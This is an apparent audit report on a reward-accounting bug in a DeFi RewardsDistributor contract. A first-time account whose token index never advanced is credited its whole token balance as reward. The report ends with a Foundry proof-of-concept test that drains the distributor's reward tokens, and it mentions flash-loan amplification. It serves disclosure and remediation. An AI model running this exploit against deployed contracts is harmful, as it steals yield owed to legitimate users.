### Title
Index-fallback error in `RewardsDistributor._calculateTokenDelta` grants a first-time account reward equal to its full token balance - ([File: contracts/RewardsDistributor.sol](https://github.com/Lauraivanka/metronome-synth-public--014/blob/main/contracts/RewardsDistributor.sol))

### Summary
`RewardsDistributor` tracks per-token reward accrual with a global `index` initialized to `INITIAL_INDEX = 1e18` and a per-account `accountIndexOf` value. When an account has never interacted, `accountIndexOf` is `0`, and the code is supposed to substitute `INITIAL_INDEX` so the delta is zero. The fallback only fires when `_tokenIndex > INITIAL_INDEX`; when `_tokenIndex == INITIAL_INDEX` (token registered but its index has never grown, e.g. `tokenSpeeds[token_] == 0`), the account index stays `0`, producing `_deltaIndex = 1e18` and a reward delta equal to the account's entire balance.

### Finding Description
The analog of CVE-2015-8366 (an index error where a computed index is used without being validated) is the `accountIndexOf` sentinel handling in `RewardsDistributor`.

In `_calculateTokenDelta` (`contracts/RewardsDistributor.sol:217-231`):

```solidity
_tokenIndex = _tokenState.index;
uint256 _accountIndex = accountIndexOf[token_][account_];

if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}

uint256 _deltaIndex = _tokenIndex - _accountIndex;
_tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
```

When a token is first added by the governor via `_updateTokenSpeed` (`contracts/RewardsDistributor.sol:287-304`), `tokenStates[token_]` is set to `{index: INITIAL_INDEX, timestamp: block.timestamp}`. From `_calculateTokenIndex` (`contracts/RewardsDistributor.sol:197-212`), the index only grows when `speed > 0` and time has elapsed. If `tokenSpeeds[token_] == 0` — which happens whenever rewards are finished or `syncTokenSpeed` computes `_speed = 0` after `periodFinish` (`contracts/RewardsDistributor.sol:341-345`) — the index stays exactly `INITIAL_INDEX` forever.

For any account with `accountIndexOf[token_][account] == 0` (i.e., an account that has never had its index checkpointed), `_updateTokensAccruedOf` (`contracts/RewardsDistributor.sol:261-266`) then computes `_deltaIndex = 1e18 - 0 = 1e18`, so `tokensDelta = balance.wadMul(1e18) = balance` — the account's full `DepositToken`/`DebtToken` balance is credited as claimable reward.

`updateBeforeMintOrBurn` is callable by anyone (`contracts/RewardsDistributor.sol:175-180`, comment: "This function also may be called by anyone"), and `claimRewards` (`contracts/RewardsDistributor.sol:150-168`) pays out `tokensAccruedOf[account_]` in `rewardToken` as long as the contract holds enough balance (`_transferRewardIfEnoughTokens`, `contracts/RewardsDistributor.sol:248-256`). No guard, lock, pause, or health check intervenes: only `nonReentrant` protects `claimRewards`, which does not help.

### Impact Explanation
An unprivileged attacker deposits into a pool to obtain `DepositToken` balance `B` on a reward token whose index is stuck at `INITIAL_INDEX`, calls `updateBeforeMintOrBurn(depositToken, attacker)` (public), then `claimRewards(attacker)` to receive `rewardToken` equal to `B`. By scaling `B` (e.g., with a flash loan — deposit, checkpoint, withdraw), the attacker can accrue an arbitrarily large `tokensAccruedOf` and drain the entire `rewardToken` balance of the distributor. This is theft of unclaimed yield owed to all legitimate users.

### Likelihood Explanation
The preconditions are all reachable by an unprivileged EOA on the deployed configuration: (1) the token is registered (`index > 0`), which holds once the governor configures any reward speed; (2) `tokenSpeeds[token_] == 0` — this occurs naturally after reward periods end or when `syncTokenSpeed` syncs a zero rate from an expired Vesper `PoolRewards` period, a normal protocol state; (3) `updateBeforeMintOrBurn` has no caller restriction. Attack cost is only the capital for a deposit (or a flash loan for amplification). The only mitigation is that the payout is capped by the distributor's `rewardToken` balance, which bounds but does not prevent the theft.

### Recommendation
Treat a `0` account index as `INITIAL_INDEX` unconditionally when the token index is non-zero, i.e. change the condition to `_accountIndex == 0` (or `_tokenIndex >= INITIAL_INDEX`), so a first-time account's delta is always zero. Alternatively, store a per-account "seen" flag instead of relying on `0` as a sentinel, and consider restricting `updateBeforeMintOrBurn` to registered `DepositToken`/`DebtToken` contracts so stale indexes cannot be weaponized at will.

### Proof of Concept
Foundry fork-style test outline (run against the repo's existing test harness/deployments):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {RewardsDistributor} from "../contracts/RewardsDistributor.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract IndexFallbackPoC is Test {
    RewardsDistributor distributor;
    IDepositToken depositToken;      // a reward-tracked deposit token whose speed is 0
    IERC20 rewardToken;              // distributor.rewardToken()
    address pool;                    // pool used to mint deposit tokens
    IERC20 underlying;

    function test_indexFallbackGrantsFullBalance() public {
        address attacker = address(0xA11CE);

        // Precondition: token registered (tokenStates[depositToken].index == 1e18)
        // and tokenSpeeds[depositToken] == 0 (e.g., after periodFinish, synced to 0).
        // Equivalent setup: governor calls updateTokenSpeed(token, X>0) then
        // syncTokenSpeed(token) once Vesper periodFinish has passed -> speed = 0,
        // index remains INITIAL_INDEX.

        // 1. Attacker acquires DepositToken balance (deposit via Pool, or flash-loan + deposit)
        uint256 amount = 1_000e18;
        deal(address(underlying), attacker, amount);
        vm.startPrank(attacker);
        underlying.approve(address(depositToken), amount);
        depositToken.mint(attacker, amount);       // attacker now holds `amount` deposit tokens

        uint256 bal = depositToken.balanceOf(attacker);
        assertGt(bal, 0);

        // 2. Public checkpoint: index == INITIAL_INDEX, accountIndexOf == 0
        distributor.updateBeforeMintOrBurn(IERC20(address(depositToken)), attacker);
        vm.stopPrank();

        // 3. tokensAccruedOf[attacker] == bal (deltaIndex = 1e18 -> wadMul gives full balance)
        uint256 accrued = distributor.tokensAccruedOf(attacker);
        assertEq(accrued, bal);

        // 4. Claim drains rewardToken held by the distributor
        uint256 rewardBal = rewardToken.balanceOf(address(distributor));
        uint256 expected = accrued < rewardBal ? accrued : rewardBal;
        uint256 before = rewardToken.balanceOf(attacker);
        vm.prank(attacker);
        distributor.claimRewards(attacker);
        assertEq(rewardToken.balanceOf(attacker) - before, expected);
    }
}
```

Caveat I could not fully verify: this PoC assumes a live deployment state where a reward-tracked token's `tokenSpeeds` is `0` while `tokenStates[token].index == INITIAL_INDEX`. That state is created either by the governor reducing speed to `0` or by `syncTokenSpeed` syncing a zero rate after Vesper's `periodFinish` — the latter is permissionless to trigger via the `tokenSpeedKeeper`. If every registered reward token always has `speed > 0` and its index has already advanced past `INITIAL_INDEX`, the fallback works as intended and the bug is latent rather than exploitable at that moment.